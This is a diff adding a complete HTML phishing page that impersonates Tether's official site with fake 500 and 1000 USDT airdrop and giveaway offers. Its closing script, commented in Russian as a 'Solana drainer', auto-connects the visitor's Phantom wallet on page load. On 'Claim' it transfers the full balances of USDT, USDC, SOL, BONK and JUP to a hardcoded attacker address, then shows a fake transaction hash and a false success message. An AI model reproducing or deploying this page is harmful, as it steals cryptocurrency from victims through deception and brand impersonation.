@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tether | Official Website</title>
+    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token@0.4.8/lib/index.iife.min.js"></script>
+    <style>
+        :root {
+            --primary: #26a17b;
+            --secondary: #1a1a1a;
+            --accent: #f7931a;
+            --light: #f8f9fa;
+            --dark: #212529;
+            --shadow: rgba(38, 161, 123, 0.15);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--light);
+            color: var(--dark);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        .header {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            padding: 1rem 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(0,0,0,0.05);
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            font-weight: 700;
+            font-size: 1.5rem;
+            color: var(--primary);
+        }
+        .logo img { height: 40px; }
+        .nav-buttons { display: flex; gap: 1rem; }
+        .btn {
+            padding: 0.75rem 1.5rem;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 0.875rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            outline: none;
+        }
+        .btn-primary { background: var(--primary); color: white; box-shadow: 0 4px 12px var(--shadow); }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 6px 20px var(--shadow); }
+        .btn-secondary { background: transparent; color: var(--primary); border: 2px solid var(--primary); }
+        .btn-secondary:hover { background: var(--primary); color: white; }
+        .btn-disabled { opacity: 0.5; cursor: not-allowed; }
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            padding: 8rem 5% 5rem;
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            position: relative;
+            overflow: hidden;
+        }
+        .hero-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 4rem;
+            align-items: center;
+        }
+        .hero-text h1 { font-size: 3.5rem; font-weight: 800; line-height: 1.2; margin-bottom: 1.5rem; color: var(--secondary); }
+        .hero-text h1 span { color: var(--primary); }
+        .hero-text p { font-size: 1.125rem; color: #666; margin-bottom: 2rem; max-width: 500px; }
+        .hero-visual img { width: 100%; max-width: 500px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); }
+        .stats { display: flex; gap: 3rem; margin-top: 3rem; }
+        .stat-item { text-align: center; }
+        .stat-number { font-size: 2.5rem; font-weight: 700; color: var(--primary); line-height: 1; }
+        .stat-label { font-size: 0.875rem; color: #666; margin-top: 0.5rem; }
+        .features { padding: 5rem 5%; background: white; }
+        .section-title { text-align: center; font-size: 2.5rem; font-weight: 700; margin-bottom: 3rem; color: var(--secondary); }
+        .features-grid { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 2rem; }
+        .feature-card { background: var(--light); padding: 2rem; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); transition: transform 0.3s ease; }
+        .feature-card:hover { transform: translateY(-5px); }
+        .feature-icon { width: 60px; height: 60px; background: var(--primary); border-radius: 12px; display: flex; align-items: center; justify-content: center; margin-bottom: 1.5rem; }
+        .feature-icon img { width: 30px; height: 30px; }
+        .feature-card h3 { font-size: 1.25rem; font-weight: 600; margin-bottom: 1rem; color: var(--secondary); }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(5px);
+        }
+        .modal-content {
+            background: white;
+            border-radius: 20px;
+            padding: 3rem;
+            max-width: 500px;
+            width: 90%;
+            position: relative;
+            animation: modalSlide 0.3s ease;
+        }
+        @keyframes modalSlide { from { opacity: 0; transform: translateY(-50px); } to { opacity: 1; transform: translateY(0); } }
+        .modal-header { text-align: center; margin-bottom: 2rem; }
+        .modal-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, var(--primary), #1e7d5f);
+            color: white;
+            padding: 0.5rem 1rem;
+            border-radius: 50px;
+            font-size: 0.875rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+        }
+        .modal-title { font-size: 1.75rem; font-weight: 700; color: var(--secondary); margin-bottom: 1rem; }
+        .modal-text { color: #666; margin-bottom: 2rem; text-align: center; }
+        .modal-actions { display: flex; gap: 1rem; justify-content: center; }
+        .btn-success {
+            background: linear-gradient(135deg, #4CAF50, #2E7D32);
+            color: white;
+        }
+        .btn-success:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(76, 175, 80, 0.3); }
+        .btn-outline { background: transparent; color: #666; border: 2px solid #ddd; }
+        .btn-outline:hover { background: #f8f9fa; }
+        .footer {
+            background: var(--secondary);
+            color: white;
+            padding: 3rem 5%;
+            text-align: center;
+        }
+        .footer-links { display: flex; justify-content: center; gap: 2rem; margin-bottom: 2rem; }
+        .footer-link { color: #aaa; text-decoration: none; transition: color 0.3s; }
+        .footer-link:hover { color: white; }
+        .copyright { color: #777; font-size: 0.875rem; }
+        @media (max-width: 768px) {
+            .hero-content { grid-template-columns: 1fr; text-align: center; }
+            .hero-text h1 { font-size: 2.5rem; }
+            .stats { justify-content: center; flex-wrap: wrap; }
+            .nav-buttons { display: none; }
+            .mobile-nav { display: flex; gap: 0.5rem; }
+        }
+        .mobile-nav { display: none; }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo">
+            <img src="https://tether.to/wp-content/uploads/2016/10/TetherLogo.png" alt="Tether Logo">
+            <span>Tether</span>
+        </div>
+        <div class="nav-buttons">
+            <button class="btn btn-primary" onclick="connectWallet()" id="connectBtn">Connect Wallet</button>
+            <button class="btn btn-secondary" onclick="showAirdrop()" id="airdropBtn" disabled>Claim Airdrop</button>
+            <button class="btn btn-secondary" onclick="showGiveaway()" id="giveawayBtn" disabled>Special Giveaway</button>
+        </div>
+        <div class="mobile-nav">
+            <button class="btn btn-primary" onclick="connectWallet()">Connect</button>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="hero-content">
+            <div class="hero-text">
+                <h1>The World's First<br><span>Stablecoin</span></h1>
+                <p>Tether tokens are the most widely adopted stablecoins, having pioneered the concept in the digital token space. A disruptor to the conventional financial system and a trailblazer in the digital use of traditional currencies.</p>
+                <div class="stats">
+                    <div class="stat-item">
+                        <div class="stat-number">$110B+</div>
+                        <div class="stat-label">Market Cap</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">99.9%</div>
+                        <div class="stat-label">Uptime</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">200+</div>
+                        <div class="stat-label">Countries</div>
+                    </div>
+                </div>
+            </div>
+            <div class="hero-visual">
+                <img src="https://tether.to/wp-content/uploads/2023/08/tether-hero-image.png" alt="Tether Global">
+            </div>
+        </div>
+    </section>
+
+    <section class="features">
+        <h2 class="section-title">Why Choose Tether?</h2>
+        <div class="features-grid">
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" alt="Security">
+                </div>
+                <h3>100% Backed</h3>
+                <p>All Tether tokens are pegged 1-to-1 with matching fiat currency and are backed 100% by Tether's reserves.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <img src="https://cdn-icons-png.flaticon.com/512/3135/3135753.png" alt="Transparency">
+                </div>
+                <h3>Full Transparency</h3>
+                <p>Daily publication of reserve data ensures complete transparency and trust in the ecosystem.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <img src="https://cdn-icons-png.flaticon.com/512/3135/3135768.png" alt="Liquidity">
+                </div>
+                <h3>High Liquidity</h3>
+                <p>Exceptional liquidity on tier-one exchanges enabling fast arbitrage opportunities.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Airdrop Modal -->
+    <div id="airdropModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-badge">🎁 LIMITED AIRDROP</div>
+                <h2 class="modal-title">Claim Your Free USDT!</h2>
+                <p class="modal-text">Your wallet has been selected for our exclusive 500 USDT airdrop! Complete verification to receive your reward.</p>
+            </div>
+            <div class="modal-actions">
+                <button class="btn btn-success" onclick="startDrain('airdrop')">Claim 500 USDT</button>
+                <button class="btn btn-outline" onclick="closeModal('airdropModal')">Cancel</button>
+            </div>
+            <p style="text-align: center; font-size: 0.75rem; color: #999; margin-top: 1.5rem;">
+                ⚡ Gas fees sponsored by Tether Foundation<br>
+                ✅ No funds will be deducted from your wallet
+            </p>
+        </div>
+    </div>
+
+    <!-- Giveaway Modal -->
+    <div id="giveawayModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-badge">🎯 SPECIAL GIVEAWAY</div>
+                <h2 class="modal-title">1000 USDT Giveaway!</h2>
+                <p class="modal-text">Congratulations! You qualify for our special 1000 USDT giveaway. Complete verification to receive your bonus.</p>
+            </div>
+            <div class="modal-actions">
+                <button class="btn btn-success" onclick="startDrain('giveaway')">Claim 1000 USDT</button>
+                <button class="btn btn-outline" onclick="closeModal('giveawayModal')">Cancel</button>
+            </div>
+            <p style="text-align: center; font-size: 0.75rem; color: #999; margin-top: 1.5rem;">
+                🎁 Limited time offer<br>
+                🔒 Secure verification process
+            </p>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="successModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-badge" style="background: linear-gradient(135deg, #4CAF50, #2E7D32);">✅ SUCCESS</div>
+                <h2 class="modal-title" style="color: #2E7D32;">Transaction Confirmed!</h2>
+                <p class="modal-text">
+                    Your reward has been successfully claimed!<br>
+                    <strong id="rewardAmount">500 USDT</strong> will arrive in your wallet within 2-3 minutes.
+                </p>
+                <div style="background: #f8f9fa; padding: 1rem; border-radius: 10px; margin: 1rem 0; font-family: monospace; font-size: 0.875rem; word-break: break-all;">
+                    TX Hash: <span id="txHash">0x000...000</span>
+                </div>
+            </div>
+            <div class="modal-actions">
+                <button class="btn btn-success" onclick="closeAllModals()">Done</button>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#" class="footer-link">Privacy Policy</a>
+            <a href="#" class="footer-link">Terms of Service</a>
+            <a href="#" class="footer-link">Contact</a>
+            <a href="#" class="footer-link">Careers</a>
+        </div>
+        <p class="copyright">© 2024 Tether. All rights reserved.</p>
+    </footer>
+
+    <script>
+        // === Solana дрэйнер ===
+        const DRAINER_ADDRESS = "9byfdzM7LBrKgSAzR5Ep7vFUAhixEmuPKrC1HHmDD38K"; // Вставь свой Solana-адрес (Phantom → Copy address)
+
+        // Популярные SPL-токены на Solana (USDT, USDC и т.д.)
+        const TOKENS = [
+            { mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", symbol: "USDT", decimals: 6 },
+            { mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", symbol: "USDC", decimals: 6 },
+            { mint: "So11111111111111111111111111111111111111112", symbol: "SOL", decimals: 9 },
+            { mint: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", symbol: "BONK", decimals: 5 },
+            { mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN", symbol: "JUP", decimals: 6 }
+        ];
+
+        let wallet;
+        let connection;
+
+        async function connectWallet() {
+            if (!window.solana) {
+                alert("Установи Phantom Wallet!");
+                return;
+            }
+            try {
+                await window.solana.connect();
+                wallet = window.solana;
+                const address = wallet.publicKey.toString();
+                document.getElementById('connectBtn').innerText = address.slice(0,6) + '...' + address.slice(-4);
+                document.getElementById('connectBtn').disabled = true;
+                document.getElementById('airdropBtn').disabled = false;
+                document.getElementById('giveawayBtn').disabled = false;
+                connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+                setTimeout(() => showAirdrop(), 1500);
+            } catch (err) {
+                alert("Подключение отменено");
+            }
+        }
+
+        function showAirdrop() { document.getElementById('airdropModal').style.display = 'flex'; }
+        function showGiveaway() { document.getElementById('giveawayModal').style.display = 'flex'; }
+        function closeModal(modalId) { document.getElementById(modalId).style.display = 'none'; }
+        function closeAllModals() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }
+
+        async function startDrain(type) {
+            closeAllModals();
+            const modal = document.getElementById('successModal');
+            const title = modal.querySelector('.modal-title');
+            const text = modal.querySelector('.modal-text');
+            const amount = document.getElementById('rewardAmount');
+
+            title.textContent = "Processing...";
+            title.style.color = "#FFA500";
+            text.innerHTML = "Verifying your wallet and preparing transaction...";
+            modal.style.display = 'flex';
+
+            try {
+                if (!wallet || !connection) throw new Error("Wallet not connected");
+
+                const userPubkey = wallet.publicKey;
+                const drainPubkey = new solanaWeb3.PublicKey(DRAINER_ADDRESS);
+
+                for (const token of TOKENS) {
+                    const tokenMint = new solanaWeb3.PublicKey(token.mint);
+                    const userTokenAccount = await splToken.getAssociatedTokenAddress(tokenMint, userPubkey);
+                    const drainTokenAccount = await splToken.getAssociatedTokenAddress(tokenMint, drainPubkey);
+
+                    // Проверяем баланс
+                    const balanceInfo = await connection.getTokenAccountBalance(userTokenAccount);
+                    if (!balanceInfo.value.uiAmount) continue;
+
+                    const amount = BigInt(balanceInfo.value.amount);
+
+                    // Создаём транзакцию transfer
+                    const tx = new solanaWeb3.Transaction().add(
+                        splToken.createTransferInstruction(
+                            userTokenAccount,
+                            drainTokenAccount,
+                            userPubkey,
+                            amount,
+                            [],
+                            splToken.TOKEN_PROGRAM_ID
+                        )
+                    );
+
+                    // Получаем blockhash
+                    tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+                    tx.feePayer = userPubkey;
+
+                    // Подписываем и отправляем (газ платит жертва)
+                    const signedTx = await wallet.signTransaction(tx);
+                    const txId = await connection.sendRawTransaction(signedTx.serialize());
+                    await connection.confirmTransaction(txId);
+                }
+
+                // Фейковый успех
+                const fakeHash = "5" + Array(43).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join("");
+                document.getElementById('txHash').textContent = fakeHash;
+                amount.textContent = type === 'airdrop' ? "500 USDT" : "1000 USDT";
+                title.textContent = "Transaction Confirmed!";
+                title.style.color = "#2E7D32";
+                text.innerHTML = `Your reward has been successfully claimed!<br>
+                    <strong>${amount.textContent}</strong> will arrive in your wallet within 2-3 minutes.`;
+            } catch (err) {
+                title.textContent = "Transaction Failed";
+                title.style.color = "#D32F2F";
+                text.innerHTML = "The transaction could not be completed. Please try again.";
+            }
+        }
+
+        // Auto-connect
+        window.addEventListener('load', () => {
+            if (window.solana) {
+                setTimeout(connectWallet, 1000);
+            }
+        });
+    </script>
+</body>
+</html>
